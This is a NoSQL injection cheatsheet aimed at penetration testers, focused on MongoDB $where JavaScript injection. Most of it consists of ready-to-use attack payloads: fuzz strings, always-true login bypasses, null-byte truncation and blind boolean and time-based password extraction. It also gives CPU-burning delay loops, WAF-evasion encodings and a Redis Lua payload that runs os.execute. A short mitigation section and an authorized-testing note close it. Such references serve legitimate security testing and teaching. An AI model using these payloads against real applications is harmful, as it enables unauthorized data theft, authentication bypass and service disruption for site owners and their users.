# NoSQL Syntax Injection Cheatsheet

## Overview

NoSQL syntax injection exploits inadequate input sanitization to break or manipulate query syntax. By injecting special characters and malicious strings, attackers can alter query logic, bypass authentication, extract data, and potentially execute arbitrary code.

---

## 1. Fuzz Strings for Detection

### Universal Fuzz Strings

Test with these strings to detect potential injection points:

| Database | Fuzz String |
|----------|-------------|
| **MongoDB** | `'"\`{ ;$Foo} $Foo \xYZ` |
| **MongoDB (JSON)** | `'\"\`{\r;$Foo}\n$Foo \\xYZ\u0000` |
| **CouchDB** | `{"$gt":""}` |
| **Cassandra** | `' OR 1=1--` |
| **Redis** | `\r\n` (CRLF injection) |
| **Generic** | `' " \ ; { } [ ] $ . > < \x00 \r \n` |

### URL-Encoded MongoDB Fuzz String

```
'%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```

**Breakdown:**
| Character | URL Encoded | Purpose |
|-----------|-------------|---------|
| `'` | `%27` | String terminator |
| `"` | `%22` | String terminator |
| `` ` `` | `%60` | Template literal |
| `{` | `%7b` | Object/expression start |
| `}` | `%7d` | Object/expression end |
| `\r\n` | `%0d%0a` | Newline (CRLF) |
| `;` | `%3b` | Statement terminator |
| `$` | `%24` | Operator prefix |
| `\x00` | `%00` | Null byte |
| `\` | `%5c` | Escape character |

---

## 2. Character-by-Character Testing

Systematically test individual characters to identify which are interpreted as syntax:

### Quote Characters

| Character | Test | Indication |
|-----------|------|------------|
| `'` | Single quote | String boundary break |
| `"` | Double quote | String boundary break |
| `` ` `` | Backtick | Template literal/JS execution |

### Structural Characters

| Character | Test | Indication |
|-----------|------|------------|
| `{` | Open brace | Object/document start |
| `}` | Close brace | Object/document end |
| `[` | Open bracket | Array start |
| `]` | Close bracket | Array end |
| `(` | Open paren | Function call/grouping |
| `)` | Close paren | Function call/grouping |
| `,` | Comma | Element separator |
| `:` | Colon | Key-value separator |
| `;` | Semicolon | Statement terminator |

### Special Characters

| Character | Test | Indication |
|-----------|------|------------|
| `$` | Dollar sign | MongoDB operator prefix |
| `.` | Dot | Property access |
| `\` | Backslash | Escape sequences |
| `/` | Forward slash | Regex delimiter |
| `\x00` | Null byte | String termination |
| `\r\n` | CRLF | Line termination |

### Escape Sequence Testing

| Sequence | URL Encoded | Purpose |
|----------|-------------|---------|
| `\'` | `%5c%27` | Escaped single quote |
| `\"` | `%5c%22` | Escaped double quote |
| `\\` | `%5c%5c` | Escaped backslash |
| `\n` | `%5c%6e` or `%0a` | Newline |
| `\r` | `%5c%72` or `%0d` | Carriage return |
| `\t` | `%5c%74` or `%09` | Tab |
| `\u0000` | `%5c%75%30%30%30%30` | Unicode null |

---

## 3. Confirming Syntax Injection

### Step 1: Break the Query

Inject a single quote to break syntax:

**Original query:**
```javascript
this.category == 'fizzy'
```

**Injected:**
```
fizzy'
```

**Resulting broken query:**
```javascript
this.category == 'fizzy''
```

*If response changes (error or different content), syntax may be injectable.*

### Step 2: Confirm with Escaped Quote

**Injected:**
```
fizzy\'
```

**Resulting query:**
```javascript
this.category == 'fizzy\''
```

*If this returns normal results, the application is likely vulnerable.*

### Step 3: Test Boolean Conditions

**False condition:**
```
fizzy' && 0 && 'x
```

**True condition:**
```
fizzy' && 1 && 'x
```

*Different responses confirm boolean injection capability.*

---

## 4. Boolean-Based Injection Payloads

### Basic Boolean Injection

| Condition | Payload | URL Encoded |
|-----------|---------|-------------|
| Always True | `' \|\| '1'=='1` | `%27%7c%7c%271%27%3d%3d%271` |
| Always True | `' \|\| 1==1 \|\| '` | `%27%7c%7c1%3d%3d1%7c%7c%27` |
| Always False | `' && '1'=='2` | `%27%26%26%271%27%3d%3d%272` |
| Always False | `' && 0 && '` | `%27%26%26+0+%26%26%27` |

### Resulting Query Examples

**Original:**
```javascript
this.category == 'fizzy'
```

**Always True Injection (`fizzy'||'1'=='1`):**
```javascript
this.category == 'fizzy'||'1'=='1'
```
*Returns all documents.*

**Always False Injection (`fizzy' && '1'=='2`):**
```javascript
this.category == 'fizzy' && '1'=='2'
```
*Returns nothing.*

### Alternative True/False Payloads

```javascript
// True conditions
' || 1 || '
' || true || '
'||''=='
' || ''=='' || '

// False conditions
' && 0 && '
' && false && '
' && ''=='x' && '
```

---

## 5. Bypassing Conditions with Null Byte

### Null Byte Truncation

Many NoSQL databases ignore characters after a null byte.

**Original query:**
```javascript
this.category == 'fizzy' && this.released == 1
```

**Injection:**
```
fizzy'\u0000
```

**URL Encoded:**
```
fizzy'%00
```

**Resulting query:**
```javascript
this.category == 'fizzy'\u0000' && this.released == 1
                         ↑
            (Everything after null is ignored)
```

*Bypasses the `released == 1` restriction.*

### Null Byte Variations

| Format | Representation |
|--------|----------------|
| URL Encoded | `%00` |
| Unicode | `\u0000` |
| Hex | `\x00` |
| JSON | `\u0000` |

---

## 6. Comment Injection

### MongoDB JavaScript Comments

| Comment Style | Syntax |
|---------------|--------|
| Single line | `//` |
| Multi-line | `/* */` |

**Injection to comment out rest of query:**
```
fizzy'// 
fizzy'/*
```

**URL Encoded:**
```
fizzy'%2f%2f
fizzy'%2f*
```

---

## 7. String Concatenation & Manipulation

### Breaking Out of Strings

| Technique | Payload | Purpose |
|-----------|---------|---------|
| Close and reopen | `fizzy' + 'x` | String concatenation |
| Close and comment | `fizzy'//` | Ignore rest of query |
| Close and terminate | `fizzy';` | End statement |
| Close with null | `fizzy'\x00` | Null termination |

### JavaScript String Methods in Injection

```javascript
// Using concat
fizzy'.concat('x

// Using template literals (if backticks work)
fizzy`

// Using charAt for extraction
' && this.password.charAt(0)=='a' && '
```

---

## 8. Context-Specific Payloads

### URL Parameter Context

**Original:**
```
https://site.com/product?category=fizzy
```

**Injections:**
```
https://site.com/product?category=fizzy'%7c%7c'1'%3d%3d'1
https://site.com/product?category=fizzy'%00
https://site.com/product?category=fizzy'+%26%26+1+%26%26+'
```

### JSON Body Context

**Original:**
```json
{"category": "fizzy"}
```

**Injections:**
```json
{"category": "fizzy'||'1'=='1"}
{"category": "fizzy'\u0000"}
{"category": "fizzy' && this.released != 1 && 'a'=='a"}
```

### Cookie Context

**Original:**
```
Cookie: category=fizzy
```

**Injections:**
```
Cookie: category=fizzy'%7c%7c'1'%3d%3d'1
Cookie: category=fizzy'%00
```

### Header Injection

**Original:**
```
X-Category: fizzy
```

**Injections:**
```
X-Category: fizzy'||'1'=='1
X-Category: fizzy'\x00
```

---

## 9. JavaScript Expression Injection ($where)

### Basic $where Syntax Injection

The `$where` operator evaluates JavaScript, making it highly exploitable.

**Injection in query value:**
```
fizzy' && this.constructor.constructor('return this')() && '
```

### Time-Based Blind Injection

**Payload:**
```javascript
fizzy' && sleep(5000) && '
fizzy' && (function(){var start=Date.now();while(Date.now()-start<5000){}})() && '
```

### Error-Based Injection

**Trigger errors for information disclosure:**
```javascript
fizzy' && this.password.toString() && '
fizzy' && (function(){throw this.password})() && '
```

### Data Extraction via $where

**Character extraction:**
```javascript
' && this.password[0]=='a' && '
' && this.password.charAt(0)=='a' && '
' && this.password.substring(0,1)=='a' && '
' && this.password.match(/^a/) && '
```

**Length detection:**
```javascript
' && this.password.length==8 && '
' && this.password.length>5 && '
```

---

## 10. Regex-Based Extraction

### Using Regex in Syntax Injection

**Basic regex injection:**
```javascript
fizzy' && /^admin/.test(this.username) && '
```

**Character-by-character extraction:**
```javascript
' && /^a/.test(this.password) && '
' && /^ab/.test(this.password) && '
' && /^abc/.test(this.password) && '
```

### Regex Special Characters

| Character | Meaning | Escaped |
|-----------|---------|---------|
| `.` | Any character | `\.` |
| `*` | Zero or more | `\*` |
| `+` | One or more | `\+` |
| `?` | Zero or one | `\?` |
| `^` | Start of string | `\^` |
| `$` | End of string | `\$` |
| `[]` | Character class | `\[\]` |
| `()` | Grouping | `\(\)` |
| `\|` | OR | `\\|` |
| `\` | Escape | `\\` |

### Useful Regex Patterns for Extraction

```javascript
^.{5}$        // Exactly 5 characters
^[a-z]+$      // Only lowercase letters
^[A-Z]+$      // Only uppercase letters  
^[0-9]+$      // Only digits
^[a-zA-Z0-9]  // Alphanumeric start
^.{8,}$       // 8 or more characters
```

---

## 11. Arithmetic & Comparison Injection

### Numeric Manipulation

```javascript
// True conditions
' || 1>0 || '
' || 1+1==2 || '
' && 1<2 && '

// Extracting numeric data
' && this.price > 100 && '
' && this.quantity == 5 && '
```

### Type Coercion Exploitation

```javascript
// JavaScript type coercion tricks
' || '1'==1 || '      // String '1' equals number 1
' || []==false || '   // Empty array is falsy
' || null==undefined || '
```

---

## 12. Quick Payload Reference

### Detection Payloads

```
'                          # Break syntax
\'                         # Test escape handling
'"\`{ ;$Foo} $Foo \xYZ     # Fuzz string
' && 0 && '                # False condition
' && 1 && '                # True condition
```

### Bypass Payloads

```
'||'1'=='1                 # Always true
'||1||'                    # Always true (short)
' || true || '             # Always true
'\u0000                    # Null byte truncation
'//                        # Comment rest
```

### Data Extraction Payloads

```
' && this.password[0]=='a' && '       # Character extraction
' && this.password.length==8 && '     # Length check
' && /^admin/.test(this.field) && '   # Regex test
```

### URL-Encoded Quick Reference

| Payload | URL Encoded |
|---------|-------------|
| `'` | `%27` |
| `"` | `%22` |
| `\|\|` | `%7c%7c` |
| `&&` | `%26%26` |
| `==` | `%3d%3d` |
| `\x00` | `%00` |
| `//` | `%2f%2f` |
| `/*` | `%2f*` |
| `{` | `%7b` |
| `}` | `%7d` |
| `$` | `%24` |
| `;` | `%3b` |
| `\n` | `%0a` |
| `\r` | `%0d` |
| `space` | `%20` or `+` |

---

## 13. Database-Specific Syntax

### MongoDB

```javascript
// Query syntax
this.field == 'value'
this.field == 'value' && this.other == 'x'
this.field == 'value' || this.field == 'y'

// Injection
this.field == 'value'||'1'=='1'
this.field == 'value' && this.password.length > 0 && 'a'=='a'
```

### CouchDB

```javascript
// Mango queries
{"selector": {"field": "value"}}

// Injection attempt
{"selector": {"field": {"$gt": ""}}}
```

### Redis (Lua Injection)

```lua
-- Original
EVAL "return redis.call('get', KEYS[1])" 1 key

-- Injection
EVAL "return redis.call('get', KEYS[1]); os.execute('id')" 1 key
```

### Cassandra (CQL)

```sql
-- Similar to SQL injection
SELECT * FROM users WHERE username='value'
SELECT * FROM users WHERE username='' OR '1'='1'
```

---

## 14. Blind Injection Techniques

### Boolean-Based Blind

**Test methodology:**
1. Establish baseline response (true condition)
2. Establish different response (false condition)
3. Use conditions to extract data bit by bit

**Example extraction:**
```javascript
// Is first character 'a'?
fizzy' && this.secret[0]=='a' && '   // Different response = yes

// Is first character 'b'?  
fizzy' && this.secret[0]=='b' && '   // Same response = no
```

### Time-Based Blind

**If true, delay response:**
```javascript
fizzy' && (this.secret[0]=='a' ? sleep(5000) : true) && '
```

**Alternative delay:**
```javascript
fizzy' && (function(){if(this.secret[0]=='a'){var x=0;for(var i=0;i<100000000;i++){x+=i;}}return true;})() && '
```

### Content-Based Blind

**Different content indicates true/false:**
```javascript
// Returns products if true
fizzy' && this.secret.length > 5 && '

// Returns nothing if false
fizzy' && this.secret.length > 100 && '
```

---

## 15. Encoding Variations

### Double URL Encoding

| Character | Single | Double |
|-----------|--------|--------|
| `'` | `%27` | `%2527` |
| `"` | `%22` | `%2522` |
| `\` | `%5c` | `%255c` |

### Unicode Encoding

| Character | Unicode |
|-----------|---------|
| `'` | `\u0027` |
| `"` | `\u0022` |
| `\` | `\u005c` |
| null | `\u0000` |

### HTML Entity Encoding

| Character | Entity |
|-----------|--------|
| `'` | `&#39;` or `&#x27;` |
| `"` | `&quot;` or `&#34;` |
| `<` | `&lt;` |
| `>` | `&gt;` |

### Mixed Encoding Bypass

```
%27                    # URL encoded '
%2527                  # Double URL encoded '
\u0027                 # Unicode '
%c0%a7                 # Overlong UTF-8 (may bypass filters)
```

---

## 16. WAF Bypass Techniques

### Case Variation (for JavaScript)

```javascript
// May bypass simple filters
' || TrUe || '
' && FaLsE && '
```

### Whitespace Alternatives

```javascript
// Tab instead of space
'%09||%09'1'=='1
// Newline instead of space
'%0a||%0a'1'=='1
// No spaces
'||'1'=='1
```

### Operator Alternatives

```javascript
// Different ways to express OR
' || true || '
' | true | '     // Bitwise OR
'|''=='          // Empty string comparison

// Different ways to express AND
' && true && '
' & true & '     // Bitwise AND
```

### Comment Obfuscation

```javascript
fizzy'/**/||/**/'1'=='1
fizzy'//\n||'1'=='1
```

---

## 17. Detection Response Indicators

| Response Type | Indication |
|---------------|------------|
| 500 Error | Syntax error, possible injection point |
| Different content | Query logic altered |
| Empty results | False condition executed |
| All results | True condition/bypass successful |
| Stack trace | Information disclosure |
| Time delay | Blind injection confirmed |
| Error message | Database type disclosure |

### Error Messages to Look For

```
SyntaxError: Unexpected token
MongoError: 
TypeError: 
ReferenceError:
MongoDB server error
unterminated string literal
unexpected end of input
```

---

## 18. Testing Methodology

### Step-by-Step Approach

1. **Identify inputs** — Find all user-controllable parameters
2. **Fuzz test** — Submit fuzz strings to each input
3. **Analyze responses** — Look for errors or behavior changes
4. **Character testing** — Test individual special characters
5. **Confirm injection** — Verify with true/false conditions
6. **Determine context** — Understand query structure
7. **Craft exploits** — Build payloads for specific goals
8. **Extract data** — Use blind techniques if needed

### Input Locations to Test

- URL parameters
- POST body (form data)
- POST body (JSON)
- Cookies
- HTTP headers
- File uploads (filename)
- WebSocket messages

---

## 19. Tools for Syntax Injection

| Tool | Purpose |
|------|---------|
| **Burp Suite** | Intercept, modify, repeat requests |
| **NoSQLMap** | Automated NoSQL injection |
| **nosqli** | NoSQL injection scanner |
| **Hackvertor** | Encoding/decoding tool |
| **CyberChef** | Data transformation |
| **Custom scripts** | Automated extraction |

---

## 20. Prevention & Mitigations

### Input Validation

```javascript
// Whitelist allowed characters
const sanitized = input.replace(/[^a-zA-Z0-9]/g, '');

// Reject dangerous patterns
if (/['"\{\}\$]/.test(input)) {
    throw new Error('Invalid input');
}
```

### Parameterized Queries

```javascript
// Mongoose - use schema validation
const userSchema = new Schema({
    username: { type: String, required: true },
    password: { type: String, required: true }
});

// Query with validated types
User.findOne({ username: String(input) });
```

### Disable JavaScript Execution

```javascript
// MongoDB configuration
mongod --noscripting

// Or in config file
security:
    javascriptEnabled: false
```

### Content-Type Enforcement

```javascript
// Only accept expected content types
if (req.headers['content-type'] !== 'application/json') {
    return res.status(400).send('Invalid content type');
}
```

---

## ⚠️ Important Notes

- Always test in authorized environments only
- Syntax injection can have unpredictable effects
- Some injections may cause data corruption
- Log and document all testing activities
- Respect scope and rules of engagement
- Report findings responsibly
